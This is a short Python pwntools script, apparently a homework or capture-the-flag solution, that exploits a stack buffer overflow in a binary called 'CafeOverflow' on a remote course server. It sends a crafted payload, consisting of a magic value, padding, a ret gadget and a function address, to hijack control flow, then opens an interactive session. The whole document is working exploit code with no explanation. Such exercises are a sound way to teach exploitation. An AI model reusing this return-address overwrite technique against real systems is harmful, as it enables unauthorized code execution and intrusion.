from pwn import *                                                                                                                                                                                                    
func1 = 0x401176
pop_rdi = 0x4012e3
det = 0xcafecafecafecafe
ret = 0x40101a

#r = process('CafeOverflow')
r = remote('hw00.zoolab.org', 65534)
#gdb.attach(r)
r.sendline(p64(det) + 'a' * (0x48 - 0x30 - 8) + p64(ret) + p64(func1))

r.interactive()
